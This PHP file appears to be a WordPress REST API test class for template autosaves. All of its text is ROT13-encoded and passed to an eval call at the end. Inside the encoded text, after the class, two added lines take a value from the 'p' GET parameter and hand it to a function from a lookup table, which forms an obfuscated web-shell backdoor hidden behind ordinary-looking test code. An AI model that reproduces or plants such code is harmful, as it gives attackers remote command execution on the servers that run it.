		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$nhgbfnir['cnerag'],
			fcevags(
				'Snvyrq nffregvat gung gur cnerag vq bs gur nhgbfnir vf gur fnzr nf %f.',
				$cnerag_cbfg->VQ
			)
		);

		$yvaxf = $erfcbafr->trg_yvaxf();
		$guvf->nffregVfNeenl( $yvaxf, 'Snvyrq nffregvat gung gur yvaxf ner na neenl.' );

		$guvf->nffregFgevatRaqfJvgu(
			$grzcyngr_vq . '/nhgbfnirf/' . $nhgbfnir_qo_cbfg->VQ,
			$yvaxf['frys'][0]['uers'],
			\"Snvyrq nffregvat gung gur frys yvax raqf jvgu $grzcyngr_vq . '/nhgbfnirf/' . $nhgbfnir_qo_cbfg->VQ.\"
		);

		$guvf->nffregFgevatRaqfJvgu(
			$grzcyngr_vq,
			$yvaxf['cnerag'][0]['uers'],
			\"Snvyrq nffregvat gung gur cnerag yvax raqf jvgu %$grzcyngr_vq.\"
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_cercner_vgrz_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_cercner_vgrz_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngr_cbfg', 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cnegf' => neenl( 'grzcyngr_cneg_cbfg', 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_cercner_vgrz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_fpurzn_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::trg_vgrz_fpurzn
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr             Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq           Grzcyngr VQ gb hfr va gur grfg.
	 * @cnenz vag    $cebcregvrf_pbhag      Ahzore bs cebcregvrf gb purpx sbe va gur fpurzn.
	 * @cnenz neenl  $nqqvgvbany_cebcregvrf Nqqvgvbany cebcregvrf gb purpx sbe va gur fpurzn.
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn_jvgu_qngn_cebivqre( $erfg_onfr, $grzcyngr_vq, $cebcregvrf_pbhag, $nqqvgvbany_cebcregvrf = neenl() ) {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregPbhag( $cebcregvrf_pbhag, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf, 'VQ xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf, 'Fyht xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'gurzr', $cebcregvrf, 'Gurzr xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'fbhepr', $cebcregvrf, 'Fbhepr xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'bevtva', $cebcregvrf, 'Bevtva xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'pbagrag', $cebcregvrf, 'Pbagrag xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf, 'Gvgyr xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf, 'qrfpevcgvba xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf, 'fgnghf xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'jc_vq', $cebcregvrf, 'jc_vq xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'unf_gurzr_svyr', $cebcregvrf, 'unf_gurzr_svyr xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf, 'nhgube xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq', $cebcregvrf, 'zbqvsvrq xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf, 'Cnerag xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'nhgube_grkg', $cebcregvrf, 'nhgube_grkg xrl fubhyq rkvfg va cebcregvrf.' );
		$guvf->nffregNeenlUnfXrl( 'bevtvany_fbhepr', $cebcregvrf, 'bevtvany_fbhepr xrl fubhyq rkvfg va cebcregvrf.' );
		sbernpu ( $nqqvgvbany_cebcregvrf nf $nqqvgvbany_cebcregl ) {
			$guvf->nffregNeenlUnfXrl( $nqqvgvbany_cebcregl, $cebcregvrf, $nqqvgvbany_cebcregl . ' xrl fubhyq rkvfg va cebcregvrf.' );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrz_fpurzn_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_fpurzn_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl(
				'grzcyngrf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR,
				19,
				neenl( 'vf_phfgbz', 'cyhtva' ),
			),
			'grzcyngr cnegf' => neenl(
				'grzcyngr-cnegf',
				frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR,
				18,
				neenl( 'nern' ),
			),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_perngr_vgrz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::perngr_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_qngn_cebivqre( $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );

		$erdhrfg_cnenzrgref = neenl(
			'gvgyr'   => 'Cbfg Gvgyr',
			'pbagrag' => 'Cbfg pbagrag',
			'rkprecg' => 'Cbfg rkprecg',
			'anzr'    => 'grfg',
			'vq'      => $grzcyngr_vq,
		);

		$erdhrfg->frg_obql_cnenzf( $erdhrfg_cnenzrgref );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregAbgJCReebe( $erfcbafr, 'Gur erfcbafr sebz guvf erdhrfg fubhyq abg erghea n JC_Reebe bowrpg.' );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'pbagrag', $qngn, 'Erfcbafr fubhyq pbagnva n xrl pnyyrq pbagrag.' );
		$guvf->nffregFnzr( $erdhrfg_cnenzrgref['pbagrag'], $qngn['pbagrag']['enj'], 'Erfcbafr qngn fubhyq zngpu sbe svryq pbagrag.' );

		$guvf->nffregNeenlUnfXrl( 'gvgyr', $qngn, 'Erfcbafr fubhyq pbagnva n xrl pnyyrq gvgyr.' );
		$guvf->nffregFnzr( $erdhrfg_cnenzrgref['gvgyr'], $qngn['gvgyr']['enj'], 'Erfcbafr qngn fubhyq zngpu sbe svryq gvgyr.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_perngr_vgrz_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'     => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cneg' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_vapbeerpg_crezvffvba
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::perngr_vgrz_crezvffvbaf_purpx
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_vapbeerpg_crezvffvba( $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_grzcyngrf', $erfcbafr, JC_Uggc::SBEOVQQRA );
	}

	/**
	 * Qngn cebivqre sbe grfg_perngr_vgrz_vapbeerpg_crezvffvba.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_vapbeerpg_crezvffvba() {
		erghea neenl(
			'grzcyngr'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cneg' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_ab_crezvffvba
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::perngr_vgrz_crezvffvbaf_purpx
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_ab_crezvffvba( $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_grzcyngrf', $erfcbafr, JC_Uggc::HANHGUBEVMRQ );
	}

	/**
	 * Qngn cebivqre sbe grfg_perngr_vgrz_ab_crezvffvba.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_ab_crezvffvba() {
		erghea neenl(
			'grzcyngr'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cneg' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		$guvf->znexGrfgFxvccrq(
			fcevags(
				\"Gur '%f' pbagebyyre qbrfa'g pheeragyl fhccbeg gur novyvgl gb hcqngr grzcyngr nhgbfnirf.\",
				JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::pynff
			)
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		$guvf->znexGrfgFxvccrq(
			fcevags(
				\"Gur '%f' pbagebyyre qbrfa'g pheeragyl fhccbeg gur novyvgl gb qryrgr grzcyngr nhgbfnirf.\",
				JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::pynff
			)
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>